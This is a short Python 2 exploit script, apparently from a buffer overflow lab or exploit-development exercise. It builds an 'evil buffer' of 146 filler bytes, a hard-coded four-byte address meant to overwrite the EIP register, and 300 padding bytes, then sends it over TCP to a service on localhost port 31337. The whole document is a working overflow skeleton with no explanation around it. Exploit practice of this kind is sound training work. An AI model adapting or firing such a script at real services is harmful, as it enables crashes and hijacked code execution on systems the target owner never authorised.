#!/usr/bin/python
import socket

try:
 print "\nSending evil buffer..."
 
 filler = "A" * 146
 eip = "\xc3\x14\x04\x08"
 buffer = "C" * 300
 
 inputBuffer = filler + eip + buffer
 
 
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("127.0.0.1", 31337))
 s.send(inputBuffer + '\r\n')
 print "\nDone!"
except:
 print "\nCould not connect!"
